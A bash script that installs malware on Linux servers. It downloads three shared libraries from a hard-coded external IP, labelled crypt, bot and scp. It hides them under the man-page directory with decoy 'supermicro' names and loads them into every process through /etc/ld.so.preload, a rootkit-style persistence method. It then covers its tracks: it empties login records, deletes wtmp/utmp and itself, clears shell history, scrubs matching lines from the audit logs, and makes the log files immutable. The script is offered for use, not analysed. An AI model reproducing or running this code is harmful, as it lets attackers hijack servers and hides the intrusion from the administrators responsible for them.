#!/bin/bash

PATH_TEMP_FILE="/tmp"

PATH_PS_INJ="/usr/share/man/man8"
PS_INJ_FILE_1="supermicro_bb.gz" #crypt
PS_INJ_FILE_2="supermicro_tt.gz" #bot
PS_INJ_FILE_3="supermicro_scp.gz" #scp
IP_SERVER="185.141.25.168"

check_root ()
{
    if [ "$EUID" -ne 0 ]
        then echo "Please run as root"
        rm -rf $PATH_TEMP_FILE/bash.sh
        exit
    fi
}

check_wget ()
{
    if rpm -q wget
    then
        echo "WGET Found!"
    else
        echo "WGET Not Found."
        echo "Install WGET and clear yum log."
        yum install wget -y
        rm -rf /var/log/yum*
    fi
}

download_exploit ()
{
    if [ -f "$PATH_PS_INJ/$PS_INJ_FILE_1" ]; then
        printf "\n$PS_INJ_FILE_1 Found!\nSkipped Download.\n"
    else
        printf "\n[+] Download File http://$IP_SERVER/binaryinject_b.so\n"
        wget -q http://$IP_SERVER/binaryinject_b.so -O $PATH_PS_INJ/$PS_INJ_FILE_1
        chmod 777 $PATH_PS_INJ/$PS_INJ_FILE_1
    fi

    if [ -f "$PATH_PS_INJ/$PS_INJ_FILE_2" ]; then
        printf "\n$PS_INJ_FILE_2 Found!\nSkipped Download.\n"
    else
        printf "\n[+] Download File http://$IP_SERVER/binaryinject_t.so\n"
        wget -q http://$IP_SERVER/binaryinject_t.so -O $PATH_PS_INJ/$PS_INJ_FILE_2
        chmod 777 $PATH_PS_INJ/$PS_INJ_FILE_2
    fi
 
    if [ -f "$PATH_PS_INJ/$PS_INJ_FILE_3" ]; then
        printf "\n$PS_INJ_FILE_3 Found!\nSkipped Download.\n"
    else
        printf "\n[+] Download File http://$IP_SERVER/binaryinject_scp.so\n"
        wget -q http://$IP_SERVER/binaryinject_scp.so -O $PATH_PS_INJ/$PS_INJ_FILE_3
        chmod 777 $PATH_PS_INJ/$PS_INJ_FILE_3
    fi 

}

ps_injection ()
{
    printf "\n==PS INJECT==\n"
    download_exploit
    if grep -q $PS_INJ_FILE_1 /etc/ld.so.preload; then
        printf "Injection $PS_INJ_FILE_1 found in ld.so.preload\n"
    else
        printf "Inject $PS_INJ_FILE_1 in ld.so.preload\n"
        echo $PATH_PS_INJ/$PS_INJ_FILE_1 >> /etc/ld.so.preload
    fi

    if grep -q $PS_INJ_FILE_2 /etc/ld.so.preload; then
        printf "Injection $PS_INJ_FILE_2 found in ld.so.preload\n"
    else
        printf "Inject $PS_INJ_FILE_2 in ld.so.preload\n"
        echo $PATH_PS_INJ/$PS_INJ_FILE_2 >> /etc/ld.so.preload
    fi
    
    if grep -q $PS_INJ_FILE_3 /etc/ld.so.preload; then
        printf "Injection $PS_INJ_FILE_3 found in ld.so.preload\n"
    else
        printf "Inject $PS_INJ_FILE_3 in ld.so.preload\n"
        echo $PATH_PS_INJ/$PS_INJ_FILE_3 >> /etc/ld.so.preload
    fi

}

clear_log ()
{
    printf "\n[+] CLEAR LOG FILE\n"
    echo > /var/log/btmp
    printf "[+] btmp clear.\n"
    echo > /var/log/lastlog
    printf "[+] lastlog clear.\n"
    rm -rf $PATH_TEMP_FILE/utmp* $PATH_TEMP_FILE/wtmp* $PATH_TEMP_FILE/bash.sh*
    printf "[+] utmpm, wtmp, bash.sh delete.\n"
    history -c
}

unset_perm_file ()
{
        chattr -i  /var/log/wtmp
        chattr -i  /var/log/btmp
        chattr -i  /var/log/lastlog
        chattr -i  /var/run/utmp
}

set_perm_file ()
{
        chattr +i  /var/log/wtmp
        chattr +i  /var/log/btmp
        chattr +i  /var/log/lastlog
        chattr +i  /var/run/utmp
}

clear_log1 ()
{
        printf "CLEAR LOG"
        #read -p "Enter your IP: " IP_CLEAR
        #sed -i "/$IP_CLEAR/d" /var/log/audit/*
        #sed -i "/$IP_CLEAR/d" /var/log/secure*
        sed -i "/supermicro/d" /var/log/audit/*
        rm -rf /var/log/yum*
}




main ()
{
    check_root
    check_wget
    ps_injection
    unset_perm_file
    clear_log
    set_perm_file
    clear_log1
}
main
